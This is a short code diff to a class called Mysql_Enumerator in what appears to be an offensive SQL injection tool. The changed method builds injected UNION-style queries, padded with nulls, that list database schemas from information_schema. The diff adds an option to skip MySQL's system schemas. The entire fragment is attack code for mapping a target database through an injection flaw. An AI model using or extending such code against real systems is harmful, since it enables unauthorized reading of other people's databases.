@@ -61,7 +61,10 @@ class Mysql_Enumerator():
     def enumerate_schemas(self, opts, poison):
         nulls = "".join([",null" for _ in range(opts.COLUMNS - 1)])
         base_poison = f"SELECT table_schema{
-            nulls} FROM information_schema.tables WHERE table_schema LIKE '"
+            nulls} FROM information_schema.tables WHERE "
+        if not opts.INCLUDE_SYSTEM_TABLES:
+            base_poison += "table_schema NOT IN ('information_schema', 'performance_schema', 'mysql', 'sys') AND "
+        base_poison += "table_schema LIKE '"
 
         return enumerate(opts, poison, base_poison, [], "table_schema")
 
